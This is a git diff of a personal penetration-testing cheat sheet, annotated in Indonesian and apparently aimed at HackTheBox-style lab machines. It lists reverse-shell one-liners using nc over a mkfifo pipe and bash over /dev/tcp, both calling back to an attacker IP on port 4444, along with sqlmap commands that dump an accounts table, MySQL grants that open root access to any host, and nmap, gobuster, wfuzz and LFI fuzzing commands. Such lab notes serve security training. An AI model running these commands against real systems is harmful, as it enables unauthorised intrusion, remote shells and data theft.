@@ -4,12 +4,16 @@ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 
 
 check service service --status-all => bisa untuk revshell atau tahap deffense
+
 python3 -c "import pty;pty.spawn('/bin/bash')" => bisa untuk interactive shell
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f => revshell mkfifo (sering berhasil)
 
 # sql map
 sqlmap -u "" --current-db => bisa untuk dapetin database
+
 sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables
+
 -D soccer_db -T accounts --dump
 
 ## with url
@@ -26,21 +30,32 @@ find / -perm -u=s -type f 2>/dev/null
 
 # fuzzing
 nmap -p- --min-rate 10000 -oA scans/nmap_alltcp 10.10.10.138
+
 nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 -oA nmap/scriptstcp 10.10.10.7
+
 nmap -A -T4 -oG writeup.gnmap 10.10.10.138
+
 masscan -p1-65535,U:1-65535 10.129.95.203 --rate=1000
+
 nmap -v -sV -p80,443 --script vuln -oA http_vuln 10.10.10.79
+
 nmap -sC -sV ip -p-
-nmap detail port 
+
+## nmap detail port 
 sudo nmap -sU -top-ports=100 panda.htb
+
 nmap -p22,50051 -sCV -Pn 10.129.37.201 -oN targeted
+
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.34.244 -oG allPorts
-ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -e .txt
+
+
 
 
 # fuzzing subdomain
 gobuster vhost -u stocker.htb -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 
+
 gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20 -o scans/
 
 # kalau misal udah fuzzing gak ada ada apa apa fungzzing pake /cig-bin -x sh,cgi,pl
@@ -49,19 +64,26 @@ gobuster-admindir-medium-php_txt_html_zip
 
 # fuzzing directory
 gobuster dir -u previse.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 
+
 wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691
 
+ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -e .txt
+
 dirsearch -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
 wfuzz -c --sc 200 -w ./common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -u http://10.10.10.191/FUZZFUZ2Z
 
 
 # mysql   
 GRANT ALL PRIVILEGES ON *.* TO root@10.129.82.0 IDENTIFIED by 'wizz' WITH GRANT OPTION;
+
 create user 'wiz'@'%' identified by 'wiz';
+
 grant all privileges on *.* to wiz@'%';
 
 # get information gathering with curl
 curl -I 10.129.230.29
+
 curl -S 
 
 # curl command send payload encode
@@ -70,6 +92,8 @@ curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.34/4444 0>&1" http://10
 # fuzzing lfi
 wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hc 404 --hh 206 http://192.168.0.119/index.php?file=FUZZ
 
+
+# check history command traversal path
 check /proc/self/cmdline => untuk lihat cmdline terakhir
 
 # spring cloud revshell
